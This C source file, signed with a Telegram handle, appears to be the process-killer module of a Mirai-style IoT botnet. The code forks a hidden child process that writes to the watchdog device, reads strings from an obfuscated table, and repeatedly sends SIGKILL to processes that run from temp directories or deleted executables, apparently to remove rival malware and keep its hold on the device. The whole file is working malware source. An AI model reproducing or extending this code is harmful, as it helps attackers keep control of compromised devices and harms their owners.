// by juan @ipmiv2 on telegram

#define _GNU_SOURCE

#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/mount.h>
#include <fcntl.h>
#include <stdio.h>

#include "headers/dbg.h"
#include "headers/config.h"
#include "headers/hide.h"
#include "headers/util.h"
#include "headers/process.h"
#include "headers/table.h"

static char self_realpath[PATH_MAX] = {0};

static uint8_t killer_table_vals[] = {
    TABLE_KILLER_PROC,
    TABLE_KILLER_EXE,
    TABLE_KILLER_SO,
    TABLE_KILLER_STDIN,
    TABLE_KILLER_NULL,
    TABLE_KILLER_CONSOLE,
    TABLE_KILLER_MAPS,
    TABLE_KILLER_TCP,
    TABLE_KILLER_TCP6,
    TABLE_KILLER_TMPDIR,
    TABLE_KILLER_EXE_DELETED,
    TABLE_KILLER_WDOG_DEV,
};

#define SUSPICIOUS_PORTS_COUNT 12
static uint16_t suspicious_ports[] = {
    48101, 48102, 1999, 1337, 6667, 6668, 6669,
    23, 2323, 22, 80, 443
};

static void kill_mounts(void) {
    int len;
    table_unlock_val(TABLE_KILLER_MOUNTS);
    char *mounts = table_retrieve_val(TABLE_KILLER_MOUNTS, &len);
    int fd = open(mounts, O_RDONLY);
    table_lock_val(TABLE_KILLER_MOUNTS);

    if (fd == -1)
        return;

    while (TRUE) {
        char rdbuf[256] = {0};
        if (util_read(fd, rdbuf, sizeof(rdbuf)) == NULL)
            break;

        table_unlock_val(TABLE_KILLER_PROC);
        char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
        int pos = util_memsearch(rdbuf, strlen(rdbuf), proc_str, len);
        table_lock_val(TABLE_KILLER_PROC);

        if (pos > 0) {
            pid_t pid = atoi(rdbuf + pos);
            if (pid && pid != getpid() && pid != getppid()) {
                DEBUG_PRINT("[killer] killing mounted pid: (%d)\n", pid);
#ifndef DEBUG
                kill(pid, SIGKILL);
#endif
            }
        }
    }

    close(fd);
}

static void kill_watchdog(void) {
    int len;
    table_unlock_val(TABLE_KILLER_WDOG_DEV);
    char *wd_path = table_retrieve_val(TABLE_KILLER_WDOG_DEV, &len);
    int wd = open(wd_path, O_WRONLY);
    if (wd != -1) {
        write(wd, "V", 1);
        close(wd);
    }
    table_lock_val(TABLE_KILLER_WDOG_DEV);
}

static BOOL check_pid_maps(char *pid) {
    int len;
    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    char maps_path[128] = {0};
    strcpy(maps_path, proc_str);
    strcat(maps_path, pid);
    table_unlock_val(TABLE_KILLER_MAPS);
    char *maps_suffix = table_retrieve_val(TABLE_KILLER_MAPS, &len);
    strcat(maps_path, maps_suffix);
    table_lock_val(TABLE_KILLER_MAPS);
    table_lock_val(TABLE_KILLER_PROC);

    int fd = open(maps_path, O_RDONLY);
    if (fd == -1)
        return FALSE;

    BOOL found = FALSE;
    int found_c = 0;

    while (TRUE) {
        char rdbuf[1024] = {0};
        if (util_read(fd, rdbuf, sizeof(rdbuf)) == NULL)
            break;

        table_unlock_val(TABLE_KILLER_SO);
        char *so_str = table_retrieve_val(TABLE_KILLER_SO, &len);
        if (util_memsearch(rdbuf, strlen(rdbuf), so_str, len) > 0) {
            found_c++;
            if (found_c == 2) {
                found = TRUE;
                table_lock_val(TABLE_KILLER_SO);
                break;
            }
        }
        table_lock_val(TABLE_KILLER_SO);
    }

    close(fd);
    return found ? FALSE : TRUE;
}

static BOOL check_pid_exe_deleted(char *pid) {
    int len;
    char exe_path[128] = {0}, realpath[PATH_MAX] = {0};

    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    strcpy(exe_path, proc_str);
    strcat(exe_path, pid);
    table_unlock_val(TABLE_KILLER_EXE);
    char *exe_suffix = table_retrieve_val(TABLE_KILLER_EXE, &len);
    strcat(exe_path, exe_suffix);
    table_lock_val(TABLE_KILLER_EXE);

    int rlen = readlink(exe_path, realpath, sizeof(realpath) - 1);
    table_lock_val(TABLE_KILLER_PROC);

    if (rlen == -1)
        return FALSE;

    realpath[rlen] = '\0';

    table_unlock_val(TABLE_KILLER_EXE_DELETED);
    char *del_str = table_retrieve_val(TABLE_KILLER_EXE_DELETED, &len);
    BOOL deleted = (util_memsearch(realpath, rlen, del_str, len) > 0);
    table_lock_val(TABLE_KILLER_EXE_DELETED);

    return deleted;
}

static BOOL check_pid_tmpdir(char *pid) {
    int len;
    char exe_path[128] = {0}, realpath[PATH_MAX] = {0};

    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    strcpy(exe_path, proc_str);
    strcat(exe_path, pid);
    table_unlock_val(TABLE_KILLER_EXE);
    char *exe_suffix = table_retrieve_val(TABLE_KILLER_EXE, &len);
    strcat(exe_path, exe_suffix);
    table_lock_val(TABLE_KILLER_EXE);

    int rlen = readlink(exe_path, realpath, sizeof(realpath) - 1);
    table_lock_val(TABLE_KILLER_PROC);

    if (rlen == -1)
        return FALSE;

    realpath[rlen] = '\0';

    table_unlock_val(TABLE_KILLER_TMPDIR);
    char *tmp_str = table_retrieve_val(TABLE_KILLER_TMPDIR, &len);
    BOOL in_tmp = (util_memsearch(realpath, rlen, tmp_str, len) > 0);
    table_lock_val(TABLE_KILLER_TMPDIR);

    return in_tmp;
}

static BOOL check_pid_realpath(char *pid) {
    int len;
    char exe_path[128] = {0}, realpath[PATH_MAX] = {0};

    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    strcpy(exe_path, proc_str);
    strcat(exe_path, pid);
    table_unlock_val(TABLE_KILLER_EXE);
    char *exe_suffix = table_retrieve_val(TABLE_KILLER_EXE, &len);
    strcat(exe_path, exe_suffix);
    table_lock_val(TABLE_KILLER_EXE);

    int rlen = readlink(exe_path, realpath, sizeof(realpath) - 1);
    if (rlen == -1 || !strcmp(realpath, self_realpath)) {
        table_lock_val(TABLE_KILLER_PROC);
        return FALSE;
    }
    table_lock_val(TABLE_KILLER_PROC);

    table_unlock_val(TABLE_KILLER_SO);
    char *so_str = table_retrieve_val(TABLE_KILLER_SO, &len);
    BOOL so_match = (util_memsearch(realpath, rlen, so_str, len) > 0);
    table_lock_val(TABLE_KILLER_SO);

    if (so_match)
        return TRUE;

    return check_pid_maps(pid);
}

static void killer(void) {
    int len;
    table_unlock_val(TABLE_KILLER_SELF);
    table_unlock_val(TABLE_KILLER_EXE);
    char *self_path = table_retrieve_val(TABLE_KILLER_SELF, &len);
    if (readlink(self_path, self_realpath, sizeof(self_realpath) - 1) == -1) {
        DEBUG_PRINT("[killer] readlink failed\n");
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_SELF);
        return;
    }
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_SELF);

    for (unsigned int i = 0; i < (sizeof(killer_table_vals) / sizeof(killer_table_vals[0])); i++)
        table_unlock_val(killer_table_vals[i]);

    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    DIR *dir = opendir(proc_str);
    if (!dir) {
        DEBUG_PRINT("[killer] opendir() failed\n");
        table_lock_val(TABLE_KILLER_PROC);
        return;
    }

    int loc = 0;
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (*entry->d_name >= '0' && *entry->d_name <= '9') {
            loc = telldir(dir);
            break;
        }
    }
    table_lock_val(TABLE_KILLER_PROC);

    while (TRUE) {
        seekdir(dir, loc);

        while ((entry = readdir(dir))) {
            if (check_pid_realpath(entry->d_name) ||
                check_pid_exe_deleted(entry->d_name) ||
                check_pid_tmpdir(entry->d_name)) {
                DEBUG_PRINT("[killer] killing pid: (%s)\n", entry->d_name);
#ifndef DEBUG
                kill(atoi(entry->d_name), SIGKILL);
#endif
            }
        }

        kill_watchdog();
        kill_mounts();

#ifdef DEBUG
        usleep(5000000);
#elif SLOW
        usleep(1000000);
#else
        usleep(250000);
#endif
    }

    closedir(dir);
}

void killer_init(void) {
    if (fork() != 0) {
        sleep(1);
        return;
    }

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[killer_init] started: (%d)\n", getpid());

    kill_mounts();
    kill_watchdog();
    killer();

    exit(0);
}
